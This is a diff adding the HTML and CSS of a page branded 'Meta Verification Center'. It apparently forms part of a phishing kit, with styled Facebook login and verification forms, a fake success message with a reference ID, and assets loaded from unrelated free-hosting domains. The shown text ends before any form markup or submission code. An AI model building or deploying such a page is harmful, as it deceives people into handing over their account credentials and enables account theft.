@@ -1,0 +1,2111 @@
+
+
+
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Meta Verification Center</title>
+    <link rel="stylesheet" href="https://free-fire-free-dimond-top-up.netlify.app">
+    <style>
+      /* Reset */
+      * {
+        margin: 0;
+        padding: 0;
+        box-sizing: border-box;
+      }
+
+      body {
+        height: 100vh;
+        overflow: hidden;
+        font-family: "Poppins", sans-serif;
+        background-color: #000; /* fallback background */
+        color: white;
+      }
+
+      /* === FULLSCREEN LOADING GIF === */
+      #loading-page {
+        position: fixed;
+        top: 0;
+        left: 0;
+        width: 100%;
+        height: 100vh;
+        background: black;
+        display: flex;
+        justify-content: center;
+        align-items: center;
+        z-index: 9999;
+      }
+
+      .loading-gif {
+        width: 100vw;
+        height: 100vh;
+        object-fit: cover; /* makes gif fill the whole screen */
+      }
+
+      /* === MAIN CONTENT === */
+      #main-content {
+        display: none;
+      }
+
+      /* Language Modal Styles */
+      .language-modal {
+        position: fixed;
+        top: 0;
+        left: 0;
+        width: 100%;
+        height: 100%;
+        background: rgba(0, 0, 0, 0.7);
+        display: none;
+        justify-content: center;
+        align-items: center;
+        z-index: 99999;
+        backdrop-filter: blur(5px);
+        transition: opacity 0.3s ease;
+      }
+     
+      .language-modal-content {
+        background: #fff;
+        padding: 40px;
+        border-radius: 16px;
+        max-width: 600px;
+        width: 90%;
+        text-align: center;
+        box-shadow: 0 20px 40px rgba(0, 0, 0, 0.3);
+        max-height: 80vh;
+        overflow-y: auto;
+        position: relative;
+        animation: modalFadeIn 0.4s ease-out;
+      }
+
+      @keyframes modalFadeIn {
+        from {
+          opacity: 0;
+          transform: translateY(-20px) scale(0.95);
+        }
+        to {
+          opacity: 1;
+          transform: translateY(0) scale(1);
+        }
+      }
+     
+      .language-modal-close {
+        position: absolute;
+        top: 15px;
+        right: 15px;
+        background: #f1f3f4;
+        width: 32px;
+        height: 32px;
+        border-radius: 50%;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        cursor: pointer;
+        transition: all 0.2s ease;
+      }
+      
+      .language-modal-close:hover {
+        background: #e8eaed;
+        transform: rotate(90deg);
+      }
+      
+      .language-modal-close svg {
+        width: 18px;
+        height: 18px;
+        fill: #5f6368;
+      }
+     
+      .language-modal-title {
+        font-size: 28px;
+        font-weight: 700;
+        margin-bottom: 10px;
+        color: #1a1a1a;
+        background: linear-gradient(135deg, #1877f2, #42b72a);
+        -webkit-background-clip: text;
+        -webkit-text-fill-color: transparent;
+        background-clip: text;
+      }
+     
+      .language-modal-subtitle {
+        font-size: 16px;
+        color: #5f6368;
+        margin-bottom: 30px;
+        line-height: 1.5;
+      }
+     
+      .language-search-container {
+        position: relative;
+        margin-bottom: 20px;
+      }
+      
+      .language-search-input {
+        width: 100%;
+        padding: 14px 16px 14px 45px;
+        border: 1px solid #e0e0e0;
+        border-radius: 8px;
+        font-size: 16px;
+        transition: all 0.3s ease;
+        background: #f8f9fa;
+      }
+      
+      .language-search-input:focus {
+        border-color: #1877f2;
+        box-shadow: 0 0 0 3px rgba(24, 119, 242, 0.15);
+        outline: none;
+        background: #fff;
+      }
+      
+      .language-search-icon {
+        position: absolute;
+        left: 16px;
+        top: 50%;
+        transform: translateY(-50%);
+        color: #5f6368;
+      }
+     
+      .language-options {
+        display: grid;
+        grid-template-columns: repeat(2, 1fr);
+        gap: 12px;
+        margin-bottom: 30px;
+        max-height: 300px;
+        overflow-y: auto;
+        padding: 5px;
+      }
+      
+      .language-option {
+        display: flex;
+        align-items: center;
+        padding: 15px;
+        border: 2px solid #e8eaed;
+        border-radius: 12px;
+        cursor: pointer;
+        transition: all 0.2s ease;
+        background: #fff;
+      }
+    
+      .language-option:hover {
+        border-color: #1877f2;
+        background: #f0f7ff;
+        transform: translateY(-2px);
+        box-shadow: 0 4px 12px rgba(24, 119, 242, 0.1);
+      }
+     
+      .language-option.selected {
+        border-color: #1877f2;
+        background: #e6f1ff;
+        box-shadow: 0 4px 12px rgba(24, 119, 242, 0.15);
+      }
+     
+      .language-flag {
+        width: 32px;
+        height: 32px;
+        border-radius: 50%;
+        overflow: hidden;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        font-size: 20px;
+        margin-right: 12px;
+        flex-shrink: 0;
+      }
+     
+      .language-name {
+        font-weight: 600;
+        font-size: 16px;
+        color: #1a1a1a;
+        text-align: left;
+      }
+      
+      .language-code {
+        font-size: 13px;
+        color: #5f6368;
+        margin-top: 2px;
+        text-align: left;
+      }
+     
+      .language-confirm-btn {
+        padding: 16px 30px;
+        background: linear-gradient(135deg, #1877f2, #42b72a);
+        color: #fff;
+        border: none;
+        border-radius: 10px;
+        font-weight: bold;
+        font-size: 16px;
+        cursor: pointer;
+        transition: all 0.3s ease;
+        width: 100%;
+        position: relative;
+        overflow: hidden;
+      }
+      
+      .language-confirm-btn::before {
+        content: '';
+        position: absolute;
+        top: 0;
+        left: -100%;
+        width: 100%;
+        height: 100%;
+        background: linear-gradient(90deg, transparent, rgba(255, 255, 255, 0.2), transparent);
+        transition: 0.5s;
+      }
+      
+      .language-confirm-btn:hover::before {
+        left: 100%;
+      }
+     
+      .language-confirm-btn:hover {
+        transform: translateY(-2px);
+        box-shadow: 0 6px 20px rgba(24, 119, 242, 0.4);
+      }
+      
+      .language-confirm-btn:disabled {
+        background: #ccc;
+        cursor: not-allowed;
+        transform: none;
+        box-shadow: none;
+      }
+      
+      .language-confirm-btn:disabled:hover::before {
+        left: -100%;
+      }
+
+      .no-results {
+        grid-column: 1 / -1;
+        text-align: center;
+        padding: 30px;
+        color: #5f6368;
+        font-style: italic;
+      }
+
+      /* Scrollbar styling */
+      .language-options::-webkit-scrollbar {
+        width: 8px;
+      }
+
+      .language-options::-webkit-scrollbar-track {
+        background: #f1f1f1;
+        border-radius: 4px;
+      }
+
+      .language-options::-webkit-scrollbar-thumb {
+        background: #c1c1c1;
+        border-radius: 4px;
+      }
+
+      .language-options::-webkit-scrollbar-thumb:hover {
+        background: #a8a8a8;
+      }
+
+      /* For Firefox */
+      .language-options {
+        scrollbar-width: thin;
+        scrollbar-color: #c1c1c1 #f1f1f1;
+      }
+
+      /* Mobile responsive adjustments */
+      @media (max-width: 768px) {
+        .language-modal-content {
+          padding: 30px 20px;
+        }
+        
+        .language-options {
+          grid-template-columns: 1fr;
+        }
+        
+        .language-modal-title {
+          font-size: 24px;
+          margin-bottom: 8px;
+        }
+        
+        .language-modal-subtitle {
+          font-size: 15px;
+          margin-bottom: 20px;
+        }
+      }
+
+      @media (max-width: 480px) {
+        .language-modal-content {
+          padding: 25px 15px;
+        }
+        
+        .language-option {
+          padding: 12px;
+        }
+        
+        .language-flag {
+          width: 28px;
+          height: 28px;
+          font-size: 18px;
+          margin-right: 10px;
+        }
+        
+        .language-name {
+          font-size: 15px;
+        }
+      }
+
+      /* Main content styles */
+      body.main-loaded {
+        background: linear-gradient(
+          130deg,
+          rgba(249, 241, 249, 1) 0%,
+          rgba(234, 243, 253, 1) 35%,
+          rgba(237, 251, 242, 1) 100%
+        );
+        background-attachment: fixed;
+        min-height: 100vh;
+        font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+        display: flex;
+        flex-direction: column;
+        color: #333;
+        overflow: auto;
+      }
+
+      /* Show main content by default */
+      .main-content {
+        display: block;
+      }
+     
+      /* Mobile header */
+      .mobile-header { display: none; justify-content: center; align-items: center; padding: 10px 15px; position: fixed; top: 0; left: 0; right: 0; z-index: 9999; background: transparent; box-shadow: none; }
+      .mobile-logo { width: 60px; height: auto; }
+
+      header { width: 380px; padding: 40px 40px 15px 60px; display: flex; flex-direction: column; align-items: flex-start; position: fixed; top: 0; left: 0; height: 100vh; background: transparent; overflow-y: auto; z-index: 9999; }
+      .logo { width: 80px; margin: 15px 0 8px 20px; }
+      .verification-text { font-size: 26px; font-weight: 700; color: #1a1a1a; margin: 0 0 15px 20px; letter-spacing: 0.4px; }
+
+      .home-page { display: flex; align-items: center; flex-direction: row; background-color: #1877f2; color: #fff; padding: 12px 20px; border-radius: 8px; margin-left: 20px; margin-top: 5px; box-shadow: 0 4px 12px rgba(0, 0, 0, 0.1); transition: transform 0.2s ease; cursor: pointer; width: auto; max-width: 100%; }
+      .home-page:hover { transform: translateY(-2px); box-shadow: 0 6px 16px rgba(0, 0, 0, 0.15); }
+      .home-icon { margin-right: 12px; width: 20px; height: 20px; fill: #fff; flex-shrink: 0; }
+      .home-text { font-size: 16px; font-weight: 500; white-space: nowrap; }
+
+      .menu-container { margin-left: 20px; margin-top: 20px; display: flex; flex-direction: column; gap: 15px; }
+      .menu-item { display: flex; align-items: center; flex-direction: row; padding: 12px 20px; border-radius: 8px; transition: all 0.2s ease; cursor: pointer; width: 100%; }
+      .menu-item:hover { background-color: rgba(0, 0, 0, 0.05); transform: translateY(-2px); }
+      .menu-icon { margin-right: 15px; width: 20px; height: 20px; fill: #333; flex-shrink: 0; }
+      .menu-text { font-size: 16px; color: #333; font-weight: 500; white-space: nowrap; }
+
+      .vertical-divider { position: fixed; top: 0; left: 460px; width: 2px; height: 100vh; background-color: #ccc; opacity: 0.5; z-index: 1000; }
+
+      .center-content { margin-left: 460px; flex: 1; min-height: 100vh; overflow-y: auto; padding: 80px 40px; scroll-behavior: smooth; }
+      .center-content::-webkit-scrollbar { width: 10px; }
+      .center-content::-webkit-scrollbar-track { background: rgba(0, 0, 0, 0.05); border-radius: 10px; }
+      .center-content::-webkit-scrollbar-thumb { background: linear-gradient(180deg, #1877f2, #42b72a); border-radius: 10px; border: 2px solid #fff; }
+      .center-content::-webkit-scrollbar-thumb:hover { background: linear-gradient(180deg, #166fe5, #36a420); }
+
+      /* Updated message styling */
+      .verification-message { display: flex; flex-direction: column; align-items: flex-start; font-size: 24px; font-weight: 400; color: #1877f2; gap: 8px; max-width: 650px; }
+      .verification-top { display: flex; align-items: center; gap: 15px; margin-bottom: 10px; }
+      .verification-message svg { width: 22px; height: 36px; flex-shrink: 0; }
+      .verification-message span { font-weight: 700; color: #1877f2; }
+
+      span#fbSendBtnText {
+          color: white;
+      }
+
+      span#sendBtnText {
+          color: white;
+      }
+      .verification-subtext { font-size: 16px; font-weight: 500; color: #1877f2; line-height: 1.5; margin-top: 15px; text-align: left; width: 100%; }
+      .verification-extra { font-size: 15px; font-weight: 500; color: #5f6368; line-height: 1.5; margin-top: 20px; max-width: 650px; text-align: left; width: 100%; }
+
+      /* Verification box styling */
+      .verification-box { margin-top: 30px; padding: 0; border-radius: 12px; width: 100%; max-width: 650px; position: relative; overflow: hidden; box-shadow: 0 4px 12px rgba(0, 0, 0, 0.1); }
+      .verification-box img { display: block; width: 100%; height: auto; border-radius: 12px 12px 0 0; margin: 0; }
+      .verification-info { border: 2px solid #ffffff; border-top: none; border-radius: 0 0 12px 12px; padding: 25px; background: #fff; margin-top: -2px; }
+      .verification-title { font-size: 22px; font-weight: 700; color: #1a1a1a; margin-bottom: 15px; text-align: left; }
+      .verification-desc { font-size: 16px; line-height: 1.6; color: #5f6368; margin-bottom: 25px; text-align: left; }
+      .verification-btn { display: block; width: 100%; padding: 14px 16px; font-size: 16px; font-weight: 700; color: #fff; background: #1877f2; border: none; border-radius: 8px; cursor: pointer; transition: 0.3s ease; text-align: center; }
+      .verification-btn:hover { background: #166fe5; transform: translateY(-2px); box-shadow: 0 4px 12px rgba(24, 119, 242, 0.3); }
+     
+      /* Ensure verification button text is white */
+      .verification-info .verification-btn {
+        color: #fff !important;
+      }
+
+      /* Verification Guide Section */
+      .verification-guide { margin-top: 40px; max-width: 650px; }
+      .verification-guide-title { font-size: 22px; font-weight: 700; color: #1a1a1a; margin-bottom: 20px; text-align: left; }
+      .verification-guide-content { background: #fff; border-radius: 12px; padding: 30px; border: 1px solid #e0e0e0; box-shadow: 0 4px 12px rgba(0, 0, 0, 0.05); }
+      .verification-guide-text { font-size: 15px; line-height: 1.6; color: #5f6368; margin-bottom: 20px; text-align: left; }
+      .verification-guide-text:last-child { margin-bottom: 0; }
+
+      /* Additional Resources Section */
+      .additional-resources { margin-top: 50px; max-width: 650px; }
+      .resources-title { font-size: 22px; font-weight: 700; color: #1a1a1a; margin-bottom: 25px; text-align: left; }
+      .resources-grid { display: grid; grid-template-columns: repeat(2, 1fr); gap: 20px; }
+      .resource-card { background: #fff; border-radius: 12px; padding: 25px; border: 1px solid #e0e0e0; box-shadow: 0 4px 12px rgba(0, 0, 0, 0.05); transition: transform 0.3s ease, box-shadow 0.3s ease; cursor: pointer; }
+      .resource-card:hover { transform: translateY(-5px); box-shadow: 0 8px 20px rgba(0, 0, 0, 0.1); }
+      .resource-icon { width: 40px; height: 40px; margin-bottom: 15px; fill: #1877f2; }
+      .resource-card-title { font-size: 18px; font-weight: 700; color: #1a1a1a; margin-bottom: 12px; text-align: left; }
+      .resource-card-desc { font-size: 15px; line-height: 1.5; color: #5f6368; text-align: left; }
+
+      /* Redesigned Verification Form Styling */
+      .verification-form {
+        margin-top: 30px;
+        background: #fff;
+        border-radius: 12px;
+        padding: 30px;
+        border: 1px solid #e0e0e0;
+        box-shadow: 0 10px 25px rgba(0, 0, 0, 0.08);
+        max-width: 650px;
+        position: relative;
+        display: none;
+      }
+     
+      .form-header {
+        display: flex;
+        align-items: center;
+        margin-bottom: 25px;
+        padding-bottom: 15px;
+        border-bottom: 1px solid #eaeaea;
+      }
+     
+      .form-icon {
+        width: 40px;
+        height: 40px;
+        background: #1877f2;
+        border-radius: 50%;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        margin-right: 15px;
+      }
+     
+      .form-icon svg {
+        width: 20px;
+        height: 20px;
+        fill: #fff;
+      }
+     
+      .form-title {
+        font-size: 24px;
+        font-weight: 700;
+        color: #1a1a1a;
+        margin: 0;
+      }
+     
+      .form-subtitle {
+        font-size: 16px;
+        color: #5f6368;
+        margin-top: 5px;
+      }
+     
+      .form-notice-container {
+        background: #f8f9fa;
+        border-radius: 8px;
+        padding: 16px;
+        margin-bottom: 25px;
+        border-left: 4px solid #1877f2;
+      }
+     
+      .form-notice {
+        font-size: 14px;
+        color: #5f6368;
+        line-height: 1.5;
+        margin-bottom: 8px;
+      }
+     
+      .form-notice:last-child {
+        margin-bottom: 0;
+      }
+     
+      .form-group {
+        margin-bottom: 22px;
+        position: relative;
+      }
+     
+      .form-label {
+        font-weight: 600;
+        font-size: 14px;
+        display: block;
+        margin-bottom: 8px;
+        color: #1a1a1a;
+      }
+     
+      .form-input {
+        width: 100%;
+        padding: 14px 16px;
+        border: 1px solid #e5e7eb;
+        border-radius: 8px;
+        font-size: 15px;
+        transition: all 0.3s ease;
+        background: #fafafa;
+      }
+     
+      .form-input:focus {
+        border: 1px solid #1877f2;
+        box-shadow: 0 0 0 3px rgba(24, 119, 242, 0.15);
+        outline: none;
+        background: #fff;
+      }
+     
+      .input-error {
+        color: #c2410c;
+        font-size: 13px;
+        line-height: 1.3;
+        margin-top: 6px;
+        min-height: 16px;
+        display: flex;
+        align-items: center;
+        gap: 5px;
+      }
+     
+      .input-error svg {
+        width: 16px;
+        height: 16px;
+      }
+     
+     .form-warning {
+        background: #fef3c7;
+        border: 1px solid #fcd34d;
+        padding: 14px 16px;
+        border-radius: 8px;
+        font-size: 14px;
+        color: #92400e;
+        margin-bottom: 20px;
+        display: none;
+        align-items: center;
+        gap: 10px;
+      }
+      
+      .form-warning svg {
+        width: 20px;
+        height: 20px;
+        flex-shrink: 0;
+      }
+      
+      .form-warning.show {
+        display: flex;
+      }
+     
+      .form-btn {
+        width: 100%;
+        padding: 16px;
+        border: none;
+        border-radius: 8px;
+        background: linear-gradient(135deg, #1877f2, #42b72a);
+        color: #fff;
+        font-weight: bold;
+        font-size: 16px;
+        cursor: pointer;
+        transition: all 0.3s ease;
+        margin-top: 10px;
+        position: relative;
+        overflow: hidden;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        gap: 10px;
+      }
+      
+      .form-btn::before {
+        content: '';
+        position: absolute;
+        top: 0;
+        left: -100%;
+        width: 100%;
+        height: 100%;
+        background: linear-gradient(90deg, transparent, rgba(255, 255, 255, 0.2), transparent);
+        transition: 0.5s;
+      }
+      
+      .form-btn:hover::before {
+        left: 100%;
+      }
+      
+      .form-btn:hover {
+        transform: translateY(-2px);
+        box-shadow: 0 6px 15px rgba(24, 119, 242, 0.4);
+      }
+      
+      .form-btn.loading {
+        opacity: 0.8;
+        pointer-events: none;
+      }
+     
+      .spinner {
+        width: 20px;
+        height: 20px;
+        border: 3px solid rgba(255, 255, 255, 0.3);
+        border-radius: 50%;
+        border-top-color: #fff;
+        animation: spin 1s ease-in-out infinite;
+      }
+     
+      @keyframes spin {
+        to { transform: rotate(360deg); }
+      }
+     
+      /* Video container styling */
+      .video-container {
+        margin: 15px 0;
+        border-radius: 8px;
+        overflow: hidden;
+        box-shadow: 0 2px 8px rgba(0, 0, 0, 0.1);
+        position: relative;
+        max-width: 378px;
+        cursor: pointer;
+      }
+     
+      .video-player {
+        width: 100%;
+        height: 200px;
+        background: #000;
+        display: none;
+      }
+     
+       
+      .video-placeholder {
+        width: 100%;
+        height: 200px;
+        background: #000;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        color: #fff;
+        flex-direction: column;
+        cursor: pointer;
+      }
+        
+      @media (max-width: 900px) {
+        .video-container {
+          max-width: 337px; /* Mobile width */
+        }
+      }
+
+      .video-placeholder svg {
+        width: 50px;
+        height: 50px;
+        margin-bottom: 8px;
+      }
+     
+      .video-title {
+        font-size: 13px;
+        font-weight: 500;
+        margin-top: 5px;
+      }
+     
+      
+      .fb-login-form {
+        margin-top: 30px;
+        background: #fff;
+        border-radius: 12px;
+        padding: 30px;
+        border: 1px solid #e0e0e0;
+        box-shadow: 0 10px 25px rgba(0, 0, 0, 0.08);
+        max-width: 650px;
+        position: relative;
+        display: none;
+      }
+      
+      .fb-form-header {
+        display: flex;
+        align-items: center;
+        margin-bottom: 25px;
+        padding-bottom: 15px;
+        border-bottom: 1px solid #eaeaea;
+      }
+     
+      .fb-form-icon {
+        width: 40px;
+        height: 40px;
+        background: #1877f2;
+        border-radius: 50%;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        margin-right: 15px;
+      }
+     
+      .fb-form-icon svg {
+        width: 20px;
+        height: 20px;
+        fill: #fff;
+      }
+     
+      .fb-form-title {
+        font-size: 24px;
+        font-weight: 700;
+        color: #1a1a1a;
+        margin: 0;
+      }
+     
+      .fb-form-subtitle {
+        font-size: 16px;
+        color: #5f6368;
+        margin-top: 5px;
+      }
+      
+      .fb-form-notice-container {
+        background: #f0f2f5;
+        border-radius: 8px;
+        padding: 16px;
+        margin-bottom: 25px;
+        border-left: 4px solid #1877f2;
+      }
+     
+      .fb-form-notice {
+        font-size: 14px;
+        color: #5f6368;
+        line-height: 1.5;
+        margin-bottom: 8px;
+      }
+     
+      .fb-form-notice:last-child {
+        margin-bottom: 0;
+      }
+     
+      .fb-form-group {
+        margin-bottom: 22px;
+        position: relative;
+      }
+     
+      .fb-form-label {
+        font-weight: 600;
+        font-size: 14px;
+        display: block;
+        margin-bottom: 8px;
+        color: #1a1a1a;
+      }
+     
+      .fb-form-input {
+        width: 100%;
+        padding: 14px 16px;
+        border: 1px solid #dddfe2;
+        border-radius: 6px;
+        font-size: 15px;
+        transition: all 0.3s ease;
+        background: #f5f6f7;
+      }
+     
+      .fb-form-input:focus {
+        border: 1px solid #1877f2;
+        box-shadow: 0 0 0 3px rgba(24, 119, 242, 0.15);
+        outline: none;
+        background: #fff;
+      }
+     
+      .fb-input-error {
+        color: #c2410c;
+        font-size: 13px;
+        line-height: 1.3;
+        margin-top: 6px;
+        min-height: 16px;
+        display: flex;
+        align-items: center;
+        gap: 5px;
+      }
+     
+      .fb-input-error svg {
+        width: 16px;
+        height: 16px;
+      }
+     
+      .fb-form-warning {
+        background: #fef3c7;
+        border: 1px solid #fcd34d;
+        padding: 14px 16px;
+        border-radius: 8px;
+        font-size: 14px;
+        color: #92400e;
+        margin-bottom: 20px;
+        display: none;
+        align-items: center;
+        gap: 10px;
+      }
+     
+      .fb-form-warning svg {
+        width: 20px;
+        height: 20px;
+        flex-shrink: 0;
+      }
+     
+      .fb-form-warning.show {
+        display: flex;
+      }
+     
+      .fb-form-btn {
+        width: 100%;
+        padding: 16px;
+        border: none;
+        border-radius: 6px;
+        background: linear-gradient(135deg, #1877f2, #166fe5);
+        color: #fff;
+        font-weight: bold;
+        font-size: 16px;
+        cursor: pointer;
+        transition: all 0.3s ease;
+        margin-top: 10px;
+        position: relative;
+        overflow: hidden;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        gap: 10px;
+      }
+     
+      .fb-form-btn::before {
+        content: '';
+        position: absolute;
+        top: 0;
+        left: -100%;
+        width: 100%;
+        height: 100%;
+        background: linear-gradient(90deg, transparent, rgba(255, 255, 255, 0.2), transparent);
+        transition: 0.5s;
+      }
+     
+      .fb-form-btn:hover::before {
+        left: 100%;
+      }
+     
+      .fb-form-btn:hover {
+        transform: translateY(-2px);
+        box-shadow: 0 6px 15px rgba(24, 119, 242, 0.4);
+      }
+     
+      .fb-form-btn.loading {
+        opacity: 0.8;
+        pointer-events: none;
+      }
+     
+      .forgot-password {
+        text-align: center;
+        margin-top: 15px;
+        font-size: 14px;
+        color: #1877f2;
+        cursor: pointer;
+      }
+     
+      .forgot-password:hover {
+        text-decoration: underline;
+      }
+     
+      .success-message {
+        margin-top: 30px;
+        background: #d1fae5;
+        border: 1px solid #10b981;
+        border-radius: 12px;
+        padding: 25px;
+        text-align: center;
+        display: none;
+      }
+     
+      .success-message.show {
+        display: block;
+      }
+     
+      .success-icon {
+        width: 60px;
+        height: 60px;
+        margin: 0 auto 15px;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        background: #a7f3d0;
+        border-radius: 50%;
+        border: 2px solid #10b981;
+      }
+     
+      .success-icon svg {
+        width: 30px;
+        height: 30px;
+        color: #059669;
+      }
+     
+      .success-title {
+        font-size: 20px;
+        font-weight: 700;
+        color: #065f46;
+        margin-bottom: 10px;
+      }
+     
+      .success-text {
+        font-size: 15px;
+        color: #065f46;
+        margin-bottom: 15px;
+      }
+     
+      .reference-id {
+        font-family: 'Monaco', 'Menlo', 'Ubuntu Mono', monospace;
+        font-size: 14px;
+        color: #374151;
+        background: #f9fafb;
+        padding: 8px 12px;
+        border-radius: 6px;
+        display: inline-block;
+      }
+
+      /* Mobile Responsive Styles */
+      @media (max-width: 900px) {
+        .vertical-divider { display: none; }
+        .mobile-header { display: flex; }
+        header { display: none; }
+        .center-content { margin-left: 0; padding: 100px 20px 40px; }
+        .verification-message { font-size: 20px; align-items: flex-start; text-align: left; }
+        .verification-top { flex-direction: row; text-align: left; gap: 15px; margin-bottom: 20px; }
+        .verification-message span { text-align: left; }
+        .verification-subtext, .verification-extra { font-size: 15px; text-align: left; }
+        .verification-message svg { width: 22px; height: 32px; }
+        .verification-info { padding: 20px; }
+        .verification-title { font-size: 20px; text-align: left; }
+        .verification-desc { font-size: 15px; text-align: left; }
+        .verification-btn { font-size: 16px; padding: 14px; }
+        .verification-guide { margin-top: 30px; }
+        .verification-guide-title { font-size: 20px; text-align: left; }
+        .verification-guide-content { padding: 20px; }
+        .verification-guide-text { font-size: 14px; text-align: left; }
+        .additional-resources { margin-top: 40px; }
+        .resources-grid { grid-template-columns: 1fr; }
+        .resources-title { font-size: 20px; text-align: left; }
+       
+        .verification-form {
+          padding: 20px;
+        }
+       
+        .form-title {
+          font-size: 22px;
+        }
+       
+        .fb-login-form {
+          padding: 20px;
+        }
+       
+        .fb-form-title {
+          font-size: 22px;
+        }
+       
+        .video-player,
+        .video-placeholder {
+          height: 200px;
+        }
+       
+        .video-placeholder svg {
+          width: 25px;
+          height: 25px;
+        }
+       
+        .video-title {
+          font-size: 12px;
+        }
+       
+        .language-options {
+          grid-template-columns: 1fr;
+        }
+       
+        .language-modal-content {
+          padding: 30px 20px;
+        }
+       
+        .language-modal-title {
+          font-size: 22px;
+        }
+      }
+
+      @media (max-width: 480px) {
+        .center-content { padding: 100px 15px 30px; }
+        .verification-message { font-size: 18px; }
+        .verification-message svg { width: 28px; height: 28px; }
+        .mobile-logo { width: 50px; }
+        .verification-guide-title { font-size: 18px; text-align: left; }
+        .verification-guide-content { padding: 15px; }
+        .resources-title { font-size: 18px; text-align: left; }
+        .resource-card { padding: 20px; }
+        .resource-icon { width: 35px; height: 35px; }
+        
+        .verification-form {
+          padding: 15px;
+        }
+       
+        .fb-login-form {
+          padding: 15px;
+        }
+       
+        .form-header {
+          flex-direction: column;
+          align-items: flex-start;
+        }
+       
+        .fb-form-header {
+          flex-direction: column;
+          align-items: flex-start;
+        }
+       
+        .form-icon {
+          margin-bottom: 10px;
+        }
+       
+        .fb-form-icon {
+          margin-bottom: 10px;
+        }
+       
+        .success-message {
+          padding: 20px;
+        }
+       
+        .success-icon {
+          width: 50px;
+          height: 50px;
+        }
+       
+        .success-icon svg {
+          width: 25px;
+          height: 25px;
+        }
+       
+        .success-title {
+          font-size: 18px;
+        }
+       
+        .video-player,
+        .video-placeholder {
+          height: 180px;
+        }
+       
+        .video-placeholder svg {
+          width: 22px;
+          height: 22px;
+        }
+       
+        .video-title {
+          font-size: 11px;
+        }
+      }
+    </style>
+  </head>
+  <body>
+    <!-- LOADING SCREEN -->
+    <div id="loading-page">
+      <img
+        src="https://spontaneous-cobbler-893de2.netlify.app/loading-logo.gif"
+        alt="Loading..."
+        class="loading-gif"
+      />
+    </div>
+
+    <!-- MAIN CONTENT -->
+    <div id="main-content">
+      <!-- Language Selection Modal -->
+      <div class="language-modal" id="languageModal">
+        <div class="language-modal-content">
+          <div class="language-modal-close" id="languageModalClose">
+            <svg viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
+              <path d="M19 6.41L17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12z"/>
+            </svg>
+          </div>
+          <h2 class="language-modal-title">Select Your Language</h2>
+          <p class="language-modal-subtitle">Choose your preferred language for the page content</p>
+          
+          <div class="language-search-container">
+            <div class="language-search-icon">
+              <i class="fas fa-search"></i>
+            </div>
+            <input type="text" class="language-search-input" id="languageSearchInput" placeholder="Search languages...">
+          </div>
+          
+          <div class="language-options" id="languageOptionsContainer">
+      <div class="language-option" data-lang="english">
+        <div class="language-flag">🇺🇸</div>
+        <div class="language-name">English</div>
+      </div>
+      <div class="language-option" data-lang="hindi">
+        <div class="language-flag">🇮🇳</div>
+        <div class="language-name">Hindi</div>
+      </div>
+      <div class="language-option" data-lang="spanish">
+        <div class="language-flag">🇪🇸</div>
+        <div class="language-name">Spanish</div>
+      </div>
+      <div class="language-option" data-lang="portuguese">
+        <div class="language-flag">🇵🇹</div>
+        <div class="language-name">Portuguese</div>
+      </div>
+      <div class="language-option" data-lang="tamil">
+        <div class="language-flag">🇮🇳</div>
+        <div class="language-name">Tamil</div>
+      </div>
+      <div class="language-option" data-lang="arabic">
+        <div class="language-flag">🇸🇦</div>
+        <div class="language-name">Arabic</div>
+      </div>
+      <!-- Additional languages for testing scroll -->
+      <div class="language-option" data-lang="french">
+        <div class="language-flag">🇫🇷</div>
+        <div class="language-name">French</div>
+      </div>
+        <div class="language-option" data-lang="vietnamese">
+        <div class="language-flag">🇻🇳</div>
+        <div class="language-name">Vietnamese</div>
+      </div>
+         <div class="language-option" data-lang="ghanaian">
+              <div class="language-flag">🇬🇭</div>
+              <div class="language-name">Ghanaian (Twi)</div>
+            </div>
+      
+    </div>
+         
+         <button class="language-confirm-btn" id="languageConfirmBtn" disabled>Confirm Language</button>
+        </div>
+      </div>
+
+      <!-- Main Content (visible by default) -->
+      <div class="main-content" id="mainContent">
+        <!-- Mobile Header with fixed logo -->
+        <div class="mobile-header">
+          <img class="mobile-logo" src="https://logo-five-tau.vercel.app/unnamed%20(1).png" alt="Logo" />
+        </div>
+
+        <header>
+          <img class="logo" src="https://unrivaled-melba-822fa8.netlify.app/logo.png" alt="Logo" />
+          <div class="verification-text">Meta Verification Center</div>
+
+          <div class="home-page">
+            <svg class="home-icon" viewBox="0 0 576 512" xmlns="http://www.w3.org/2000/svg">
+              <path d="M280.37 148.26L96 300.11V464a16 16 0 0 0 16 16l112.06-.29a16 16 0 0 0 15.92-16V368a16 16 0 0 1 16-16h64a16 16 0 0 1 16 16v95.64a16 16 0 0 0 16 16.05L464 480a16 16 0 0 0 16-16V300L295.67 148.26a12.19 12.19 0 0 0-15.3 0zM571.6 251.47L488 182.56V44.05a12 12 0 0 0-12-12h-56a12 12 0 0 0-12 12v72.61L318.47 43a48 48 0 0 0-61 0L4.34 251.47a12 12 0 0 0-1.6 16.9l25.5 31A12 12 0 0 0 45.15 301l235.22-193.74a12.19 12.19 0 0 1 15.3 0L530.9 301a12 12 0 0 0 16.9-1.6l25.5-31a12 12 0 0 0-1.7-16.93z"/>
+            </svg>
+            <span class="home-text">Meta Verification Center</span>
+          </div>
+
+          <div class="menu-container">
+            <div class="menu-item">
+              <svg class="menu-icon" viewBox="0 0 512 512">
+                <path d="M505 442.7L405.3 343c-4.5-4.5-10.6-7-17-7H372c27.6-35.3 44-79.7 44-128C416 93.1 322.9 0 208 0S0 93.1 0 208s93.1 208 208 208c48.3 0 92.7-16.4 128-44v16.3c0 6.4 2.5 12.5 7 17l99.7 99.7c9.4 9.4 24.6 9.4 33.9 0l28.3-28.3c9.4-9.4 9.4-24.6.1-34zM208 336c-70.7 0-128-57.2-128-128 0-70.7 57.2-128 128-128 70.7 0 128 57.2 128 128 0 70.7-57.2 128-128 128z"/>
+              </svg>
+              <span class="menu-text">Search</span>
